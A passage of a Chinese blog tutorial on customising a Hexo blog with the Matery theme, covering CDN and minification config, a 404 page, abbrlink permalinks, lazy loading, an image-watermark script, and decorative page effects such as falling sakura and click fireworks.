<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. */</span></span><br><span class="line"><span class="selector-class">.bg-color</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(to right, #<span class="number">4</span>cbf30 <span class="number">0%</span>, #<span class="number">0</span>f9d58 <span class="number">100%</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@-webkit-keyframes</span> rainbow &#123;</span><br><span class="line">   <span class="comment">/* 动态切换背景颜色. */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@keyframes</span> rainbow &#123;</span><br><span class="line">    <span class="comment">/* 动态切换背景颜色. */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*如果不需要，可以将上面三个注释掉*/</span></span><br></pre></td></tr></table></figure>

<p>如果不需要的话，直接将上面三个注释掉即可。</p>
<h3 id="修改-banner-图和文章特色图"><a href="#修改-banner-图和文章特色图" class="headerlink" title="修改 banner 图和文章特色图"></a>修改 banner 图和文章特色图</h3><p>你可以直接在 <code>/source/medias/banner</code> 文件夹中更换你喜欢的 <code>banner</code> 图片，主题代码中是每天切换一张，只需 <code>7</code> 张即可。如果你会 <code>JavaScript</code> 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，<code>banner</code> 切换的代码位置在 <code>/layout/_partial/bg-cover-content.ejs</code> 文件的 `` 代码中：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;.bg-cover&#x27;).css(&#x27;background-image&#x27;, &#x27;url(/medias/banner/&#x27; + new Date().getDay() + &#x27;.jpg)&#x27;);</span><br></pre></td></tr></table></figure>

<p>如想每小时切换,将<code>getDay()</code>改为<code>getHours()</code>即可,但是需要增加图片的数量为24，且在_config.yml中做修改相应。</p>
<p>在 <code>/source/medias/featureimages</code> 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 <code>_config.yml</code> 做同步修改</p>
<h3 id="添加文章评论插件"><a href="#添加文章评论插件" class="headerlink" title="添加文章评论插件"></a>添加文章评论插件</h3><p>主题自带<code>gittalk</code>,<code>gitment</code>,<code>valine</code>等评论插件，只需要去相应的官网注册，然后将相应的配置填入到主题的<code>_config.yml</code>中相应位置即可。</p>
<p>注：<code>gitalk</code>评论模块对文字表格有影响，并且经常加载不出来</p>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h3 id="配置CDN"><a href="#配置CDN" class="headerlink" title="配置CDN"></a>配置CDN</h3><p>cdn加速，只需要将主题文件夹下的<code>_config.yml</code>最后遗一行配置即可。后面填<code>https://cdn.jsdelivr.net/gh/</code>加上你的github账户名和你的博客地址，例如我的：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">I0gan:</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">https://cdn.jsdelivr.net/gh/I0gan/I0gan.github.io</span></span><br></pre></td></tr></table></figure>

<p>在根目录配置文件 <code>_config.yml</code> 末尾加入以下配置：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#hexo-neat 优化提速插件（去掉HTML、css、js的blank字符）</span></span><br><span class="line"><span class="attr">neat_enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">neat_html:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/*.md&#x27;</span></span><br><span class="line"><span class="attr">neat_css:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/*.min.css&#x27;</span></span><br><span class="line"><span class="attr">neat_js:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mangle:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">output:</span></span><br><span class="line">  <span class="attr">compress:</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/*.min.js&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/**/instantpage.js&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/matery.js&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="新建404页面"><a href="#新建404页面" class="headerlink" title="新建404页面"></a>新建404页面</h3><p>主题并没有404页面，所以我们来添加一个，<code>source</code>目录下新建一个<code>404.md</code>，内容：</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">title: 404</span><br><span class="line">date: 2020-2-22 19:20:00</span><br><span class="line">type: &quot;404&quot;</span><br><span class="line">layout: &quot;404&quot;</span><br><span class="line">description: &quot;Oops～，我崩溃了！找不到你想要的页面 :(&quot;</span><br></pre></td></tr></table></figure>

<p>接着在/matery/layout/新建一个404.ejs文件，内容：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="comment">/* don&#x27;t remove. */</span></span></span><br><span class="line"><span class="css">    <span class="selector-class">.about-cover</span> &#123;</span></span><br><span class="line">        height: 75vh;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bg-cover pd-header about-cover&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col s10 offset-s1 m8 offset-m2 l8 offset-l2&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;brand&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;title center-align&quot;</span>&gt;</span></span><br><span class="line">                        404</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;description center-align&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">%=</span> <span class="attr">page.description</span> %&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 每天切换 banner 图. </span></span></span><br><span class="line"><span class="javascript">    $(<span class="string">&#x27;.bg-cover&#x27;</span>).css(<span class="string">&#x27;background-image&#x27;</span>, <span class="string">&#x27;url(/medias/banner/&#x27;</span> + <span class="keyword">new</span> <span class="built_in">Date</span>().getDay() + <span class="string">&#x27;.jpg)&#x27;</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="文章生成永久链接"><a href="#文章生成永久链接" class="headerlink" title="文章生成永久链接"></a>文章生成永久链接</h3><p>主题默认的文章链接配置</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">premalink:</span> <span class="string">:year/:month/:day/:title</span></span><br></pre></td></tr></table></figure>

<p>这种生成的链接地址很长，我们可以修改文章生成链接的格式。</p>
<p>首先再根目录下执行下面的命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure>

<p>在博客文件夹根目录下<code>_config.yml</code>添加如下配置</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">abbrlink:</span></span><br><span class="line">    <span class="attr">alg:</span> <span class="string">crc16</span>   <span class="comment">#算法： crc16(default) and crc32</span></span><br><span class="line">    <span class="attr">rep:</span> <span class="string">hex</span>     <span class="comment">#进制： dec(default) and hex: dec </span></span><br><span class="line">                <span class="comment">#输出进制：十进制和十六进制，默认为10进制。丨dec为十进制，hex为十六进制</span></span><br></pre></td></tr></table></figure>

<p>再将站点配置文件的<code>permalink</code>的值修改为：</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">permalink:</span> <span class="string">posts/:abbrlink.html</span></span><br></pre></td></tr></table></figure>

<p>生成文章的链接格式格式如下（官方样例）:</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">crc16</span> <span class="string">&amp;</span> <span class="string">hex</span></span><br><span class="line"><span class="string">https://post.zz173.com/posts/66c8.html</span></span><br><span class="line"></span><br><span class="line"><span class="string">crc16</span> <span class="string">&amp;</span> <span class="string">dec</span></span><br><span class="line"><span class="string">https://post.zz173.com/posts/65535.html</span></span><br><span class="line"><span class="string">crc32</span> <span class="string">&amp;</span> <span class="string">hex</span></span><br><span class="line"><span class="string">https://post.zz173.com/posts/8ddf18fb.html</span></span><br><span class="line"></span><br><span class="line"><span class="string">crc32</span> <span class="string">&amp;</span> <span class="string">dec</span></span><br><span class="line"><span class="string">https://post.zz173.com/posts/1690090958.html</span></span><br></pre></td></tr></table></figure>

<p>生成完后，原md文件的Front-matter 内会增加<code>abbrlink</code> 字段，值为生成的ID 。这个字段确保了在我们修改了<code>Front-matter</code> 内的博客标题title或创建日期date字段之后而不会改变链接地址</p>
<h3 id="图片懒加载"><a href="#图片懒加载" class="headerlink" title="图片懒加载"></a>图片懒加载</h3><p><code>懒加载</code>一般是当图片滚动进可视窗口内才加载图片，可视窗口之外的图片则不加载</p>
<p>本主题图片进行懒加载，这样做效果就是 <code>html</code>、<code>css</code>、<code>js</code> 加载之后，图片再加载。既保证了网页的打开速度，也不会因图片的庞大体积而拖累了整个页面的加载。</p>
<p>先安装插件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-lazyload-image --save</span><br></pre></td></tr></table></figure>

<p>然后到博客根目录下<code>_config.yml</code>中加入以下字段：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 懒加载</span></span><br><span class="line"><span class="attr">lazyload:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># 是否开启图片懒加载</span></span><br><span class="line">  <span class="attr">onlypost:</span> <span class="literal">false</span> <span class="comment"># 是否只对文章的图片做懒加载</span></span><br><span class="line">  <span class="attr">loadingImg:</span> <span class="string">/images/loading.gif</span></span><br></pre></td></tr></table></figure>

<p>其中gif图的位置应该放在<code>source/images/</code>下</p>
<h3 id="设置文字模板"><a href="#设置文字模板" class="headerlink" title="设置文字模板"></a>设置文字模板</h3><p><code>Hexo</code>的页面是包括一个<code>md</code>文件和<code>ejs</code>文件结合而成的，<code>md</code>文件中的内容是页面配置，基本信息，和显示的内容。而<code>ejs</code>文件就是<code>js</code>逻辑代码了。</p>
<p>我们在<code>scaffolds/post.md</code>中设置文章的默认模板，这样以后创建文章的时候，这些信息就默认添加上了，不同文章你也可以修改这些信息。上面Front-matter已经介绍过了</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">author: 布莱恩特科比酱</span><br><span class="line">img:</span><br><span class="line">top:</span><br><span class="line">cover:</span><br><span class="line">coverImg:</span><br><span class="line">password:</span><br><span class="line">toc:</span><br><span class="line">mathjax:</span><br><span class="line">summary:</span><br><span class="line">categories:</span><br><span class="line">tags:</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<h3 id="图片添加水印"><a href="#图片添加水印" class="headerlink" title="图片添加水印"></a>图片添加水印</h3><p>为了防止别人抄袭你文章，直接用你文字的图片，可以把所有的图片都加上水印。在博客根目录下新建一个<code>watermark.py</code>，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageDraw</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageFont</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">watermark</span>(<span class="params">post_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> post_name == <span class="string">&#x27;all&#x27;</span>:</span><br><span class="line">        post_name = <span class="string">&#x27;*&#x27;</span></span><br><span class="line">    dir_name = <span class="string">&#x27;source/_posts/&#x27;</span> + post_name + <span class="string">&#x27;/*&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> files <span class="keyword">in</span> glob.glob(dir_name):</span><br><span class="line">        im = Image.<span class="built_in">open</span>(files)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(im.getbands()) &lt; <span class="number">3</span>:</span><br><span class="line">            im = im.convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">            print(files)</span><br><span class="line">        font = ImageFont.truetype(<span class="string">&#x27;STSONG.TTF&#x27;</span>, <span class="built_in">max</span>(<span class="number">30</span>, <span class="built_in">int</span>(im.size[<span class="number">1</span>] / <span class="number">20</span>)))</span><br><span class="line">        draw = ImageDraw.Draw(im)</span><br><span class="line">        draw.text((im.size[<span class="number">0</span>] / <span class="number">2</span>, im.size[<span class="number">1</span>] / <span class="number">2</span>),</span><br><span class="line">                  <span class="string">u&#x27;@hiyoung&#x27;</span>, fill=(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>), font=font)</span><br><span class="line">        im.save(files)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        watermark(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;[usage] &lt;input&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>字体也放根目录下，自己找字体。然后每次写完一篇文章可以运行<code>python3 watermark.py postname</code>添加水印，如果第一次运行要给所有文章添加水印，可以运行<code>python3 watermark.py all</code></p>
<p>这个代码的逻辑就是从文章目录下拿到图片，添加水印。这个前提是要文章的图片放在source/_posts/下，所以如果在文章中直接引用了其他地方的图片链接，那么这个脚本不会去给那个图片加水印了</p>
<h3 id="动态标签栏"><a href="#动态标签栏" class="headerlink" title="动态标签栏"></a>动态标签栏</h3><p>在<code>theme/matery/layout/layout.ejs</code>下添加如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type= <span class="string">&quot;text/javascript&quot;</span> &gt;</span><br><span class="line">    <span class="keyword">var</span> OriginTitile=<span class="built_in">document</span>.title,st;</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">&quot;visibilitychange&quot;</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.hidden?(<span class="built_in">document</span>.title=<span class="string">&quot;ヽ(●-`Д´-)ノ你要玩捉迷藏嘛&quot;</span>,<span class="built_in">clearTimeout</span>(st)):(<span class="built_in">document</span>.title=<span class="string">&quot;(Ő∀Ő3)ノ被发现啦！&quot;</span>,st=<span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">document</span>.title=OriginTitile&#125;,<span class="number">3e3</span>))</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="修改导航栏颜色以及透明效果"><a href="#修改导航栏颜色以及透明效果" class="headerlink" title="修改导航栏颜色以及透明效果"></a>修改导航栏颜色以及透明效果</h3><p><code>themes/matery/source/css/matery.css</code>文件中，有一个<code>.bg-color</code>属性，修改其属性值即可，代码如下：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.bg-color</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(to right, #<span class="number">4</span>cbf30 <span class="number">0%</span>, #<span class="number">0</span>f9d58 <span class="number">100%</span>); </span><br><span class="line">    //修改成自己喜欢的颜色值</span><br><span class="line">    <span class="selector-tag">opacity</span>: 0<span class="selector-class">.8</span>;  </span><br><span class="line">    //透明效果 值范围 0~1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="外链跳转插件"><a href="#外链跳转插件" class="headerlink" title="外链跳转插件"></a>外链跳转插件</h3><p>跳转外链相关插件。自动为所有<code>html</code>文件中外链的<code>a</code>标签生成对应的属性。 比如 设置 <code>target=&#39;_blank&#39;</code>, <code>rel=&#39;external nofollow noopener noreferrer&#39;</code> 告诉搜索引擎这是外部链接,不要将该链接计入权重。 同时自动生成外链跳转页面,默认在根目录下<code>go.html</code>;</p>
<p>安装插件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-external-link --save</span><br></pre></td></tr></table></figure>

<p>配置插件：</p>
<p>在<code>Hexo</code>根目录的<code>_config.yml</code>文件中添加如下配置。</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hexo_external_link:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">enable_base64_encode:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">url_param_name:</span> <span class="string">&#x27;u&#x27;</span></span><br><span class="line">  <span class="attr">html_file_name:</span> <span class="string">&#x27;go.html&#x27;</span></span><br><span class="line">  <span class="attr">target_blank:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">link_rel:</span> <span class="string">&#x27;external nofollow noopener noreferrer&#x27;</span></span><br><span class="line">  <span class="attr">domain:</span> <span class="string">&#x27;your_domain&#x27;</span> <span class="comment"># 如果开启了防盗链</span></span><br><span class="line">  <span class="attr">safety_chain:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>enable</strong> - 是否开启<code>hexo_external_link</code>插件 - 默认 false</li>
<li><strong>enable_base64_encode</strong> - 是否对跳转<code>url</code>使用<code>base64编码</code> - 默认 fasle</li>
<li><strong>url_param_name</strong> - url参数名,在跳转到外链传递给<code>html_file_name</code>的参数名 - 默认 ‘u’</li>
<li><strong>html_file_name</strong> - 跳转到外链的页面文件路径 - 默认 ‘go.html’</li>
<li><strong>target_blank</strong> - 是否为外链的<code>a</code>标签添加<code>target=&#39;_blank&#39;</code> - 默认 true</li>
<li><strong>link_rel</strong> - 设置外链的<code>a</code>标签的rel属性 - 默认 ‘external nofollow noopener noreferrer’</li>
<li><strong>domain</strong> - 如果开启了防盗链,除了 localhost 和 domain 之外调用会跳到主页,同时也是判断链接是否为外链的依据 - 默认 window.location.host</li>
<li><strong>safety_chain</strong> - go.html 为了防止外链盗用 对域名进行的判断 - 默认 false</li>
</ul>
<h3 id="添加鼠标点击烟花爆炸效果"><a href="#添加鼠标点击烟花爆炸效果" class="headerlink" title="添加鼠标点击烟花爆炸效果"></a>添加鼠标点击烟花爆炸效果</h3><p><code>themes/matery/source/js</code>目录下新建<code>fireworks.js</code>文件，打开将内容复制粘贴到<code>fireworks.js</code>。</p>
<p>然后在<code>themes/matery/layout/layout.ejs</code>文件内添加以下内容：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;canvas <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;fireworks&quot;</span> style=<span class="string">&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot;</span> &gt;&lt;/canvas&gt; </span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;</span>&gt;&lt;/script&gt; </span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;/js/fireworks.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="添加樱花飘落效果"><a href="#添加樱花飘落效果" class="headerlink" title="添加樱花飘落效果"></a>添加樱花飘落效果</h3><p>在<code>themes/matery/source/js</code>目录下新建<code>sakura.js</code>文件，打开<br>将内容复制粘贴到<code>sakura.js</code>。</p>
<p>然后在<code>themes/matery/layout/layout.ejs</code>文件内添加以下内容：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="comment">//只在桌面版网页启用特效</span></span><br><span class="line"><span class="keyword">var</span> windowWidth = $(<span class="built_in">window</span>).width();</span><br><span class="line"><span class="keyword">if</span> (windowWidth &gt; <span class="number">768</span>) &#123;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/sakura.js&quot;&gt;&lt;\/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="添加鼠标彩虹星星掉落跟随效果"><a href="#添加鼠标彩虹星星掉落跟随效果" class="headerlink" title="添加鼠标彩虹星星掉落跟随效果"></a>添加鼠标彩虹星星掉落跟随效果</h3><p>在<code>themes/matery/source/js</code>目录下新建<code>cursor.js</code>文件，打开<br>将内容复制粘贴到<code>cursor.js</code>。</p>
<p>然后在<code>themes/matery/layout/layout.ejs</code>文件内添加以下内容：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;/js/snow.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="添加雪花飘落效果"><a href="#添加雪花飘落效果" class="headerlink" title="添加雪花飘落效果"></a>添加雪花飘落效果</h3><p>在<code>themes/matery/source/js</code>目录下新建<code>cursor.js</code>文件，打开<a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cHM6Ly9naXRodWIuY29tL2F4aDIwMTgvc2NyaXB0L2Jsb2IvbWFzdGVyL3Nub3cuanM=">https://github.com/axh2018/script/blob/master/snow.js</a><br>将内容复制粘贴到<code>cursor.js</code>。</p>
<p>然后在<code>themes/matery/layout/layout.ejs</code>文件内添加以下内容：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;/js/snow.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="添加鼠标点击文字特效"><a href="#添加鼠标点击文字特效" class="headerlink" title="添加鼠标点击文字特效"></a>添加鼠标点击文字特效</h3><p>主题文件下的<code>/source/js/</code>下新建<code>click_show_text.js</code>，以下代码添到<code>js</code>中：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a_idx = <span class="number">0</span>;</span><br><span class="line">jQuery(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span> (<span class="params">$</span>) </span>&#123;</span><br><span class="line">    $(<span class="string">&quot;body&quot;</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">&quot;富强&quot;</span>, <span class="string">&quot;民主&quot;</span>, <span class="string">&quot;文明&quot;</span>, <span class="string">&quot;和谐&quot;</span>, <span class="string">&quot;自由&quot;</span>, <span class="string">&quot;平等&quot;</span>, <span 